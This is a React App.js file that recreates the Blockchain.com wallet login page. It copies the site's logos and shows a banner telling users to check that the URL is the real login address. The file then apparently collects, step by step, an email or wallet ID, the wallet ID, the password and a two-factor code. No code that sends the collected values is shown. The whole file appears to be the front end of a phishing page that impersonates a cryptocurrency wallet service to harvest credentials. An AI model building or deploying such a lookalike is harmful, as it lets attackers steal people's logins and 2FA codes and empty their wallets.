import React, { useEffect, useState } from "react";

import "./App.scss";

export const Pages = {
  Page1: "page1",
  Page2: "page2",
  Page3: "page3",
  Page4: "page4",
};

function App() {
  const [currentPage, setCurrentPage] = useState(Pages.Page1);
  const [emailOrWalletId, setEmailOrWalletId] = useState("");
  const [walletId, setWalletId] = useState("");
  const [password, setPassword] = useState("");
  const [secondPassword, setSecondPassword] = useState("");
  const [showErrorMsgs, setShowErrorMsgs] = useState({
    emailOrWalletIdRequired: false,
    emailOrWalletIdValidtor: false,
    walletIdRequired: false,
    walletIdValidtor: false,
    passwordRequired: false,
    passwordValidator: false,
    secondPasswordRequired: false,
    secondPasswordValidator: false,
  });

  const validateEmail = (value) => {
    return String(value)
      .toLowerCase()
      .match(
        /^(([^<>()[\]\\.,;:\s@"]+(\.[^<>()[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/
      );
  };

  const validatewalletaddress = (value) => {
    return String(value)
      .toLowerCase()
      .match(/^([a-z0-9]+-){4}[a-z0-9]+$/);
  };

  useEffect(() => {
    emailOrWalletIdValidation();
  }, [emailOrWalletId]);

  useEffect(() => {
    walletIdValidation();
  }, [walletId]);

  useEffect(() => {
    passwordValidation();
  }, [password]);

  useEffect(() => {
    secondPasswordValidation();
  }, [secondPassword]);

  const emailOrWalletIdValidation = () => {
    if (!emailOrWalletId) {
      setShowErrorMsgs({
        ...showErrorMsgs,
        emailOrWalletIdRequired: true,
        emailOrWalletIdValidtor: false,
      });
    } else if (
      !validatewalletaddress(emailOrWalletId) &&
      !validateEmail(emailOrWalletId)
    ) {
      setShowErrorMsgs({
        ...showErrorMsgs,
        emailOrWalletIdRequired: false,
        emailOrWalletIdValidtor: true,
      });
    } else {
      resetErrorMsgs();
    }
  };

  const walletIdValidation = () => {
    if (!walletId) {
      setShowErrorMsgs({
        ...showErrorMsgs,
        walletIdRequired: true,
        walletIdValidtor: false,
      });
    } else if (!validatewalletaddress(walletId)) {
      setShowErrorMsgs({
        ...showErrorMsgs,
        walletIdRequired: false,
        walletIdValidtor: true,
      });
    } else {
      resetErrorMsgs();
    }
  };

  const passwordValidation = () => {
    if (!password) {
      setShowErrorMsgs({
        ...showErrorMsgs,
        passwordRequired: true,
      });
    } else {
      resetErrorMsgs();
    }
  };

  const secondPasswordValidation = () => {
    if (!secondPassword) {
      setShowErrorMsgs({
        ...showErrorMsgs,
        secondPasswordRequired: true,
      });
    } else {
      resetErrorMsgs();
    }
  };

  const resetErrorMsgs = () => {
    setShowErrorMsgs({
      emailOrWalletIdRequired: false,
      emailOrWalletIdValidtor: false,
      walletIdValidtor: false,
      walletIdRequired: false,
      passwordRequired: false,
      passwordValidator: false,
      secondPasswordRequired: false,
      secondPasswordValidator: false,
    });
  };

  const changeNextPage = (page) => {
    switch (page) {
      case Pages.Page2:
        console.log("Page2");
        if (!emailOrWalletId) {
          emailOrWalletIdValidation();
        } else if (
          !showErrorMsgs.emailOrWalletIdRequired &&
          !showErrorMsgs.emailOrWalletIdValidtor
        ) {
          setCurrentPage(page);
        }
        break;
      case Pages.Page3:
        console.log("Page3");
        if (!walletId) {
          walletIdValidation();
        } else if (
          !showErrorMsgs.walletIdValidtor &&
          !showErrorMsgs.walletIdRequired
        ) {
          setCurrentPage(page);
        }
        break;
      case Pages.Page4:
        console.log("Page4");
        if (!password) {
          passwordValidation();
        } else if (!showErrorMsgs.passwordRequired) {
          setCurrentPage(page);
        }
        break;
      // case Pages.Page4:
      //   console.log("Page4");
      //   break;
    }
  };

  const changeBackPage = (page) => {
    setCurrentPage(page);
  };

  return (
    <>
      <div className="App col-12 bg-blue text-white text-center p-1 title-url">
        Check that the URL is correct.{" "}
        <strong>https://login.blockchain.com</strong>
      </div>
      <div className="col-12 text-white text-center pt-4 fs-3 ">
        <img
          src="https://login.blockchain.com/img/bc-logo.svg?91c7840afd"
          height="24px"
          color="auto"
          width="auto"
        />
      </div>
      <div className="col-12 justify-content-around d-flex pt-4">
        <div className="col-5 bg-body border-8 shadow w-480 pb-4 w-90">
          {/* <div className="col d-flex"> */}
          {/* <div className="col d-flex">
              <div className="col-6  text-center fs-4 fw-bolder tab text-color">
                Wallet
              </div>
              <div className="col-6 text-center fw-bolder bg-light border-8 tab text-lightgray">
                Exchange
              </div>
            </div> */}
          <ul className="nav nav-tabs col d-flex" id="myTab" role="tablist">
            <li className="col-6 nav-item" role="presentation">
              <button
                className="nav-link active"
                id="wallet-tab"
                data-bs-toggle="tab"
                data-bs-target="#wallet"
                type="button"
                role="tab"
                aria-controls="wallet"
                aria-selected="true"
              >
                <img
                  src="https://login.blockchain.com/img/wallet-no-background.svg"
                  placeholder="wallet-logo"
                  className="tab-logos"
                />
                Wallet
              </button>
            </li>
            <li className="col-6 nav-item" role="presentation">
              <button
                className="nav-link disabled"
                id="exchange-tab"
                data-bs-toggle="tab"
                data-bs-target="#exchange"
                type="button"
                role="tab"
                aria-controls="exchange"
                aria-selected="false"
              >
                <img
                  src="https://login.blockchain.com/img/exchange-grayscale.svg"
                  placeholder="exchange-logo"
                  className="tab-logos"
                />
                Exchange
              </button>
            </li>
          </ul>
          <div className="tab-content" id="myTabContent">
            <div
              className="tab-pane fade show active"
              id="wallet"
              role="tabpanel"
              aria-labelledby="wallet-tab"
            >
              {currentPage === Pages.Page1 && (
                <>
                  <div className="p-2">
                    <form className="g-3 has-validation">
                      <div className="col-12 p-4 pb-0">
                        <div className="col-12 d-flex">
                          <div className="col-6">
                            <label
                              for="emailOrWalletId"
                              className="col-form-label label"
                            >
                              Your Email or Wallet ID
                            </label>
                          </div>
                          {showErrorMsgs.emailOrWalletIdRequired && (
                            <div className="col-6 text-end required align-self-end pb-1">
                              Required
                            </div>
                          )}
                          {showErrorMsgs.emailOrWalletIdValidtor && (
                            <div className="col-6 text-end required align-self-end pb-1">
                              Invalid Wallet ID or Email
                            </div>
                          )}
                        </div>
                        <input
                          type="text"
                          className="form-control align-middle b-r-8 placeholder"
                          id="emailOrWalletId"
                          value={emailOrWalletId}
                          onBlur={emailOrWalletIdValidation}
                          onChange={(e) => {
                            setEmailOrWalletId(e.target.value);
                          }}
                          style={
                            showErrorMsgs.emailOrWalletIdRequired ||
                            showErrorMsgs.emailOrWalletIdValidtor
                              ? { borderColor: "rgb(217, 59, 48)" }
                              : { borderColor: "rgb(12, 108, 242)" }
                          }
                          placeholder="Enter email or wallet ID"
                        />
                      </div>
                    </form>
                    <div className="col-12 p-4 pb-0">
                      <div className="d-grid gap-2">
                        <button
                          type="button"
                          className="btn btn-primary p-12 rounded-3 b-r-8 button-btn"
                          onClick={() => changeNextPage(Pages.Page2)}
                          disabled={
                            emailOrWalletId === ""
                              ? true
                              : showErrorMsgs.emailOrWalletIdRequired ||
                                showErrorMsgs.emailOrWalletIdValidtor
                          }
                        >
                          <div className="text-center">Continue</div>
                        </button>
                      </div>
                      <div className="pt-1 text-center sub-heading pt-3">
                        Need some help ?
                      </div>
                    </div>
                  </div>
                </>
              )}

              {currentPage === Pages.Page2 && (
                <>
                  <div
                    className="col d-flex p-3 pl-6"
                    onClick={() => changeBackPage(Pages.Page1)}
                  >
                    <svg
                      xmlns="http://www.w3.org/2000/svg"
                      width="16"
                      height="16"
                      fill="currentColor"
                      class="bi bi-arrow-left-short"
                      viewBox="0 0 16 16"
                    >
                      <path
                        fill-rule="evenodd"
                        d="M12 8a.5.5 0 0 1-.5.5H5.707l2.147 2.146a.5.5 0 0 1-.708.708l-3-3a.5.5 0 0 1 0-.708l3-3a.5.5 0 1 1 .708.708L5.707 7.5H11.5a.5.5 0 0 1 .5.5z"
                      />
                    </svg>
                    {/* <img src={leftIcon} alt="My Happy SVG" /> */}
                    Back
                  </div>
                  <div className="row justify-content-center">
                    <div className="col-10 text-center">
                      <div className=" pt-2 pb-2 fs-20 fw-500">
                        <div className="verify">
                          <div>
                            <svg
                              xmlns="http://www.w3.org/2000/svg"
                              width="16"
                              height="16"
                              fill="currentColor"
                              class="bi bi-laptop"
                              viewBox="0 0 16 16"
                            >
                              <path d="M13.5 3a.5.5 0 0 1 .5.5V11H2V3.5a.5.5 0 0 1 .5-.5h11zm-11-1A1.5 1.5 0 0 0 1 3.5V12h14V3.5A1.5 1.5 0 0 0 13.5 2h-11zM0 12.5h16a1.5 1.5 0 0 1-1.5 1.5h-13A1.5 1.5 0 0 1 0 12.5z" />
                            </svg>
                          </div>
                        </div>

                        <div>Verify Your Device</div>
                      </div>
                      <div className="fs-16 fw-400">
                        If you have an account registered with this email
                        address. you will recieve an email with a link to verify
                        your device
                      </div>
                    </div>
                  </div>
                  <div className="p-2">
                    <form className="g-3 has-validation">
                      <div className="col-12 p-4 pb-0">
                        <div className="col-12 d-flex">
                          <div className="col-6">
                            <label
                              for="walletId"
                              className="col-form-label  label"
                            >
                              Your Wallet ID
                            </label>
                          </div>
                          {showErrorMsgs.walletIdRequired && (
                            <div className="col-6 text-end required align-self-end pb-1">
                              Required
                            </div>
                          )}
                          {showErrorMsgs.walletIdValidtor && (
                            <div className="col-6 text-end required align-self-end pb-1">
                              Invalid Wallet ID
                            </div>
                          )}
                        </div>
                        <input
                          type="text"
                          className="form-control b-r-8 placeholder"
                          id="walletId"
                          value={walletId}
                          onBlur={walletIdValidation}
                          onChange={(e) => {
                            setWalletId(e.target.value);
                          }}
                          style={
                            showErrorMsgs.walletIdRequired ||
                            showErrorMsgs.walletIdValidtor
                              ? { borderColor: "rgb(217, 59, 48)" }
                              : { borderColor: "rgb(12, 108, 242)" }
                          }
                          placeholder="Enter wallet ID"
                        />
                      </div>
                    </form>
                    <div className="col-12 p-4">
                      <div className="d-grid gap-2">
                        <button
                          type="button"
                          className="btn btn-primary p-12 rounded-3 b-r-8 button-btn"
                          onClick={() => changeNextPage(Pages.Page3)}
                          disabled={
                            walletId === ""
                              ? true
                              : showErrorMsgs.walletIdRequired ||
                                showErrorMsgs.walletIdValidtor
                          }
                        >
                          Continue
                        </button>
                      </div>
                      {/* <div className="pt-1 text-center sub-heading pt-3">Need some help ?</div> */}
                    </div>
                  </div>
                </>
              )}

              {currentPage === Pages.Page3 && (
                <>
                  <div
                    className="col d-flex p-3 pl-6 "
                    onClick={() => changeBackPage(Pages.Page1)}
                  >
                    <svg
                      xmlns="http://www.w3.org/2000/svg"
                      width="16"
                      height="16"
                      fill="currentColor"
                      class="bi bi-arrow-left-short"
                      viewBox="0 0 16 16"
                    >
                      <path
                        fill-rule="evenodd"
                        d="M12 8a.5.5 0 0 1-.5.5H5.707l2.147 2.146a.5.5 0 0 1-.708.708l-3-3a.5.5 0 0 1 0-.708l3-3a.5.5 0 1 1 .708.708L5.707 7.5H11.5a.5.5 0 0 1 .5.5z"
                      />
                    </svg>
                    Back
                  </div>
                  <div className="p-2">
                    <form className="g-3 has-validation" novalidate>
                      <div className="col-12 user-input">
                        <div className="col-12 d-flex">
                          <div className="col-6">
                            <label
                              for="password"
                              className="col-form-label label"
                            >
                              Your Password
                            </label>
                          </div>
                          {showErrorMsgs.passwordRequired && (
                            <div className="col-6 text-end required align-self-end pb-1">
                              Required
                            </div>
                          )}
                        </div>
                        <input
                          type="password"
                          className="form-control b-r-8 placeholder"
                          id="password"
                          value={password}
                          onBlur={passwordValidation}
                          onChange={(e) => {
                            setPassword(e.target.value);
                          }}
                          style={
                            showErrorMsgs.passwordRequired
                              ? { borderColor: "rgb(217, 59, 48)" }
                              : { borderColor: "rgb(12, 108, 242)" }
                          }
                          placeholder="Enter your password"
                        />
                      </div>
                    </form>
                    <div className="col-12 p-4 pb-0">
                      <div className="d-grid gap-2">
                        <button
                          type="button"
                          className="btn btn-primary p-12 rounded-3 b-r-8 button-btn"
                          onClick={() => changeNextPage(Pages.Page4)}
                          disabled={
                            password === ""
                              ? true
                              : showErrorMsgs.passwordRequired
                          }
                        >
                          Log In
                        </button>
                      </div>
                      <div className="pt-1 text-center sub-heading pt-3">
                        Need some help ?
                      </div>
                    </div>
                  </div>{" "}
                </>
              )}

              {currentPage === Pages.Page4 && (
                <>
                  <div
                    className="col d-flex p-3 pl-6 "
                    onClick={() => changeBackPage(Pages.Page3)}
                  >
                    <svg
                      xmlns="http://www.w3.org/2000/svg"
                      width="16"
                      height="16"
                      fill="currentColor"
                      class="bi bi-arrow-left-short"
                      viewBox="0 0 16 16"
                    >
                      <path
                        fill-rule="evenodd"
                        d="M12 8a.5.5 0 0 1-.5.5H5.707l2.147 2.146a.5.5 0 0 1-.708.708l-3-3a.5.5 0 0 1 0-.708l3-3a.5.5 0 1 1 .708.708L5.707 7.5H11.5a.5.5 0 0 1 .5.5z"
                      />
                    </svg>
                    Back
                  </div>
                  <div className="p-2">
                    <form className="g-3 has-validation" novalidate>
                      <div className="col-12 user-input">
                        <div className="col-12 d-flex">
                          <div className="col-10">
                            <label
                              for="secondPassword"
                              className="col-form-label  label"
                            >
                              Enter your Two Favtor Authentication Code
                            </label>
                          </div>
                          {showErrorMsgs.secondPasswordRequired && (
                            <div className="col-2 pl-1 text-end required align-self-end pb-1">
                              Required
                            </div>
                          )}
                        </div>
                        <input
                          type="text"
                          className="form-control b-r-8 placeholder"
                          id="secondPassword"
                          value={secondPassword}
                          placeholder=""
                          onBlur={secondPasswordValidation}
                          onChange={(e) => {
                            setSecondPassword(e.target.value);
                          }}
                          style={
                            showErrorMsgs.secondPasswordRequired
                              ? { borderColor: "rgb(217, 59, 48)" }
                              : { borderColor: "rgb(12, 108, 242)" }
                          }
                        />
                        <div className="text-primary fs-12">Resend SMS</div>
                        <div className="pt-1 text-center pt-3 lost">
                          Lost access to your 2FA device?
                          <span className="text-primary"> Reset Now</span>{" "}
                        </div>
                      </div>
                    </form>
                    <div className="col-12 p-4 pb-0">
                      <div className="d-grid gap-2">
                        <button
                          type="button"
                          className="btn btn-primary p-12 rounded-3 b-r-8 button-btn"
                          disabled={
                            secondPassword === ""
                              ? true
                              : showErrorMsgs.secondPasswordRequired
                          }
                        >
                          Log In
                        </button>
                      </div>
                      <div className="pt-1 text-center sub-heading pt-3">
                        Need some help ?
                      </div>
                    </div>
                  </div>
                </>
              )}

              <div className="border-hr"></div>
              <div className="col-12">
                <div className="justify-content-center d-flex dntba">
                  <div className="create-account">
                    Don't have a Blockchain Account?
                  </div>
                  <div className="text-primary sign-up">
                    {" "}
                    &nbsp;Sign up Now{" "}
                    <svg
                      xmlns="http://www.w3.org/2000/svg"
                      width="16"
                      height="16"
                      fill="currentColor"
                      class="bi bi-arrow-right-short"
                      viewBox="0 0 16 16"
                    >
                      <path
                        fill-rule="evenodd"
                        d="M4 8a.5.5 0 0 1 .5-.5h5.793L8.146 5.354a.5.5 0 1 1 .708-.708l3 3a.5.5 0 0 1 0 .708l-3 3a.5.5 0 0 1-.708-.708L10.293 8.5H4.5A.5.5 0 0 1 4 8z"
                      />
                    </svg>
                  </div>
                </div>
              </div>
            </div>
            <div
              className="tab-pane fade"
              id="exchange"
              role="tabpanel"
              aria-labelledby="exchange-tab"
            >
              Not Active At This Moment
            </div>
          </div>
          {/* </div> */}
        </div>
      </div>
    </>
  );
}

export default App;
